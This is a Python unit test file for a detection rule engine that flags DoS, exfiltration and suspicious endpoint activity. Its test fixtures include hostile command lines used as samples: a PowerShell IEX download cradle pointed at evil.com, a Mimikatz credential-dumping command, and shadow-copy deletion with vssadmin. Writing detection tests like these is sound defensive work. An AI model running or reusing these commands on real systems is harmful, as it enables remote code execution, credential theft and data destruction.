"""Unit tests for detection.rule_engine."""
import sys
from pathlib import Path

import numpy as np
import pandas as pd
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from detection.rule_engine import evaluate_endpoint, evaluate_flows, FLOW_RULES, ENDPOINT_RULES, ALL_RULES


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _flow(src_ip="10.0.0.1", dst_ip="8.8.8.8", dst_port=80, duration=1.0, fwd_pkts=10, bwd_pkts=5,
          fwd_bytes=5000, bwd_bytes=2000, pkts_per_s=10.0, timestamp=None, event_id=None, source="synthetic"):
    ts = timestamp or pd.Timestamp("2024-01-01 12:00:00")
    return {
        "event_id": event_id or "evt-001",
        "timestamp": ts, "source": source,
        "src_ip": src_ip, "dst_ip": dst_ip, "dst_port": dst_port,
        "duration": duration, "fwd_pkts": fwd_pkts, "bwd_pkts": bwd_pkts,
        "fwd_bytes": fwd_bytes, "bwd_bytes": bwd_bytes, "pkts_per_s": pkts_per_s,
        "protocol": "TCP", "gt_label": 0, "gt_category": "BENIGN",
    }


def _endpoint(event_type="process_create", process="cmd.exe", command_line="cmd.exe /c dir",
              file_path=None, src_ip="10.0.0.5", dst_ip=None, dst_port=None,
              hostname="ws-dev-01", username="user1", timestamp=None, event_id=None):
    ts = timestamp or pd.Timestamp("2024-01-01 12:00:00")
    return {
        "event_id": event_id or "ep-001",
        "timestamp": ts, "source": "sysmon",
        "event_type": event_type, "process": process, "command_line": command_line,
        "file_path": file_path, "src_ip": src_ip, "dst_ip": dst_ip, "dst_port": dst_port,
        "hostname": hostname, "username": username, "gt_label": 0, "gt_category": "BENIGN",
    }


def _flows_df(*rows) -> pd.DataFrame:
    df = pd.DataFrame(list(rows))
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    return df


def _ep_df(*rows) -> pd.DataFrame:
    df = pd.DataFrame(list(rows))
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    return df


# ---------------------------------------------------------------------------
# evaluate_flows
# ---------------------------------------------------------------------------

class TestEvaluateFlows:
    def test_benign_flow_no_hit(self):
        df = evaluate_flows(_flows_df(_flow(fwd_pkts=5, pkts_per_s=10, fwd_bytes=1000)))
        assert not df["rule_hit"].any()

    def test_dos_rule_triggers(self):
        # NET-002: pkts_per_s >= 1500 AND fwd_pkts >= 100
        f = _flow(pkts_per_s=2000, fwd_pkts=200)
        df = evaluate_flows(_flows_df(f))
        assert df["rule_hit"].iloc[0]
        assert "NET-002" in df["rule_ids"].iloc[0]
        assert df["rule_category"].iloc[0] == "DoS"

    def test_exfiltration_rule_triggers(self):
        # NET-004: external dst AND fwd_bytes >= 2_000_000
        f = _flow(dst_ip="8.8.8.8", fwd_bytes=3_000_000)
        df = evaluate_flows(_flows_df(f))
        assert df["rule_hit"].iloc[0]
        assert "NET-004" in df["rule_ids"].iloc[0]
        assert df["rule_category"].iloc[0] == "Exfiltration"

    def test_internal_traffic_no_exfil(self):
        # Destination is internal: exfiltration rule should NOT fire
        f = _flow(dst_ip="10.1.2.3", fwd_bytes=3_000_000)
        df = evaluate_flows(_flows_df(f))
        exfil_hits = [r for row in df["rule_ids"] for r in row if r == "NET-004"]
        assert not exfil_hits

    def test_rule_severity_nonzero_on_hit(self):
        f = _flow(pkts_per_s=2000, fwd_pkts=200)
        df = evaluate_flows(_flows_df(f))
        assert df["rule_severity"].iloc[0] > 0

    def test_no_hit_severity_zero(self):
        df = evaluate_flows(_flows_df(_flow()))
        assert df["rule_severity"].iloc[0] == 0

    def test_scan_rule_requires_window(self):
        """Port-scan rule is window-based; single row can't trigger it alone."""
        f = _flow()
        df = evaluate_flows(_flows_df(f))
        scan_hits = [r for row in df["rule_ids"] for r in row if r == "NET-001"]
        assert not scan_hits  # single flow never meets 20-port threshold

    def test_multiple_rules_fire(self):
        # Craft a flow that matches both DoS (NET-002) and large-bytes (NET-004 would need external)
        f = _flow(dst_ip="8.8.8.8", fwd_bytes=3_000_000, pkts_per_s=2000, fwd_pkts=200)
        df = evaluate_flows(_flows_df(f))
        assert len(df["rule_ids"].iloc[0]) >= 2

    def test_rule_names_non_empty_on_hit(self):
        f = _flow(pkts_per_s=2000, fwd_pkts=200)
        df = evaluate_flows(_flows_df(f))
        assert df["rule_names"].iloc[0] != ""

    def test_detect_time_column_present(self):
        df = evaluate_flows(_flows_df(_flow()))
        assert "rule_detect_time" in df.columns


# ---------------------------------------------------------------------------
# evaluate_endpoint
# ---------------------------------------------------------------------------

class TestEvaluateEndpoint:
    def test_empty_df_returns_empty(self):
        df = evaluate_endpoint(pd.DataFrame())
        assert df.empty

    def test_benign_command_no_hit(self):
        ep = _endpoint(process="notepad.exe", command_line="notepad.exe README.txt")
        df = evaluate_endpoint(_ep_df(ep))
        assert not df["rule_hit"].any()

    def test_powershell_encoded_triggers_ep001(self):
        ep = _endpoint(
            process="powershell.exe",
            command_line="powershell.exe -EncodedCommand dABlAHMAdAA=",
        )
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_hit"].iloc[0]
        assert "EP-001" in df["rule_ids"].iloc[0]

    def test_powershell_iex_triggers_ep001(self):
        ep = _endpoint(process="powershell.exe", command_line="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com')")
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_hit"].iloc[0]

    def test_mimikatz_triggers_ep002(self):
        ep = _endpoint(command_line="sekurlsa::logonpasswords")
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_hit"].iloc[0]
        assert "EP-002" in df["rule_ids"].iloc[0]

    def test_vssadmin_triggers_ep003(self):
        ep = _endpoint(command_line="vssadmin delete shadows /all /quiet")
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_hit"].iloc[0]
        assert "EP-003" in df["rule_ids"].iloc[0]

    def test_suspicious_port_triggers_ep005(self):
        ep = _endpoint(event_type="network_connect", dst_port=4444)
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_hit"].iloc[0]
        assert "EP-005" in df["rule_ids"].iloc[0]

    def test_normal_port_no_ep005(self):
        ep = _endpoint(event_type="network_connect", dst_port=443)
        df = evaluate_endpoint(_ep_df(ep))
        ep005 = [r for row in df["rule_ids"] for r in row if r == "EP-005"]
        assert not ep005

    def test_rule_category_set_on_hit(self):
        ep = _endpoint(process="powershell.exe", command_line="powershell.exe -enc abc")
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_category"].iloc[0] is not None

    def test_rule_severity_nonzero_on_hit(self):
        ep = _endpoint(command_line="sekurlsa::logonpasswords")
        df = evaluate_endpoint(_ep_df(ep))
        assert df["rule_severity"].iloc[0] > 0


# ---------------------------------------------------------------------------
# ALL_RULES registry
# ---------------------------------------------------------------------------

class TestAllRules:
    def test_all_rules_registered(self):
        for r in FLOW_RULES + ENDPOINT_RULES:
            assert r.rule_id in ALL_RULES

    def test_rule_severity_in_range(self):
        for r in ALL_RULES.values():
            assert 0 <= r.severity <= 100

    def test_rule_has_description(self):
        for r in ALL_RULES.values():
            assert r.description
